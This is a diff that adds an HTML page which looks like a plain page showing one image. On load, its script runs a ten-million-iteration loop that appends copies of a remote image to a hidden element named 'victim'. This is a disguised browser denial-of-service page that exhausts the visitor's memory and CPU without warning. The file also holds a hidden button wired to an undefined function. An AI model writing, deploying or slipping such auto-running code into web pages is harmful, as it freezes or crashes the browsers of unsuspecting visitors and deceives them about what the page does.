@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body{
+            margin: 0 0;
+            padding: 0 0;
+        }
+        .target{
+            margin: 0 0;
+            padding: 0 0;
+        }
+        .img{
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+    <script>
+        
+        function load(){
+            for(let i=0;i<=10000000;i++){
+                console.log(i)
+                victim = document.getElementById("victim")
+                let img_element = document.createElement("img");
+                img_element.src = "https://helios-i.mashable.com/imagery/articles/00d6hZQ4F4Jfx1e5ZYh78k9/hero-image.fill.size_1248x702.v1637074377.jpg";
+                victim.appendChild(img_element);
+            }
+        }
+    </script>
+</head>
+<body onload="load();">
+    <input type="button" id="but" hidden onclick="start();">
+    <div class="target">
+        <img src="https://helios-i.mashable.com/imagery/articles/00d6hZQ4F4Jfx1e5ZYh78k9/hero-image.fill.size_1248x702.v1637074377.jpg" alt="" class="img">
+    </div>
+    <div id="victim" hidden></div>
+</body>
+</html>
